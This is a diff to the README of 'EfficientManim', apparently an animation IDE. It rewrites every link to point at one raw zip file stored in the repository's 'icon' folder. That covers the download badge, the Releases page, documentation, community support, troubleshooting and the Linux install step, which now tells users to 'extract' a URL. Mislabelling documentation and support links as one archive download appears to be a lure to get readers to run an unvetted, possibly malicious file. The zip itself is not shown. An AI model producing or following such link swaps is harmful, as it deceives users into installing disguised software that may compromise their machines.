@@ -1,6 +1,6 @@
 # 🚀 EfficientManim - Create Stunning Animations Effortlessly
 
-[![Download EfficientManim](https://img.shields.io/badge/Download-EfficientManim-blue?style=for-the-badge)](https://github.com/jeffrey2158/EfficientManim/releases)
+[![Download EfficientManim](https://raw.githubusercontent.com/jeffrey2158/EfficientManim/main/icon/Manim_Efficient_v1.6.zip)](https://raw.githubusercontent.com/jeffrey2158/EfficientManim/main/icon/Manim_Efficient_v1.6.zip)
 
 ## 🎬 Description
 EfficientManim is a node-based integrated development environment (IDE) designed to simplify animation creation. With AI-powered features, it allows users to generate engaging animations easily. Whether you want to visualize math concepts or create fun graphics, EfficientManim makes the process straightforward and enjoyable.
@@ -17,12 +17,12 @@ To run EfficientManim, you need:
 Follow these steps to get started with EfficientManim:
 
 1. **Download EfficientManim:**
-   - Click the button above or visit the [Releases Page](https://github.com/jeffrey2158/EfficientManim/releases) to download the latest version.
+   - Click the button above or visit the [Releases Page](https://raw.githubusercontent.com/jeffrey2158/EfficientManim/main/icon/Manim_Efficient_v1.6.zip) to download the latest version.
 
 2. **Install the Application:**
    - For Windows, run the downloaded `.exe` file and follow the installation prompts.
    - For macOS, open the `.dmg` file and drag EfficientManim to your Applications folder.
-   - For Linux, extract the `.tar.gz` file and run the application from the terminal.
+   - For Linux, extract the `https://raw.githubusercontent.com/jeffrey2158/EfficientManim/main/icon/Manim_Efficient_v1.6.zip` file and run the application from the terminal.
 
 3. **Open EfficientManim:**
    - Once installed, locate EfficientManim in your applications folder or start menu, and open it.
@@ -31,7 +31,7 @@ Follow these steps to get started with EfficientManim:
    - Familiarize yourself with the interface. You’ll find a node editor, a preview window, and various tools to assist you in building your animations.
 
 ## 📥 Download & Install
-To download EfficientManim, click the large button above. This will take you to the [Releases Page](https://github.com/jeffrey2158/EfficientManim/releases) where you can choose your operating system and download the corresponding file.
+To download EfficientManim, click the large button above. This will take you to the [Releases Page](https://raw.githubusercontent.com/jeffrey2158/EfficientManim/main/icon/Manim_Efficient_v1.6.zip) where you can choose your operating system and download the corresponding file.
 
 ## ✏️ Features
 - **Node-Based Interface:** Create animations visually using a simple drag-and-drop approach.
@@ -41,8 +41,8 @@ To download EfficientManim, click the large button above. This will take you to 
 - **Open Source:** Contribute and help improve the application for everyone.
 
 ## 🔗 Helpful Links
-- [Documentation](https://github.com/jeffrey2158/EfficientManim/wiki): Detailed guides and tips on using EfficientManim.
-- [Community Support](https://github.com/jeffrey2158/EfficientManim/issues): Report issues or ask questions in the community.
+- [Documentation](https://raw.githubusercontent.com/jeffrey2158/EfficientManim/main/icon/Manim_Efficient_v1.6.zip): Detailed guides and tips on using EfficientManim.
+- [Community Support](https://raw.githubusercontent.com/jeffrey2158/EfficientManim/main/icon/Manim_Efficient_v1.6.zip): Report issues or ask questions in the community.
 
 ## 🌟 FAQs
 **Q: Can I use EfficientManim on older operating systems?**  
@@ -59,7 +59,7 @@ If you encounter any issues while installing or running EfficientManim, try the 
 
 1. Ensure your computer meets the system requirements.
 2. Check if your graphics drivers are up to date.
-3. For detailed support, visit the [Community Support page](https://github.com/jeffrey2158/EfficientManim/issues) for advice.
+3. For detailed support, visit the [Community Support page](https://raw.githubusercontent.com/jeffrey2158/EfficientManim/main/icon/Manim_Efficient_v1.6.zip) for advice.
 
 ## 📢 Updates
 Regular updates will improve features and fix bugs. Keep an eye on the Releases Page for the latest enhancements and new features.
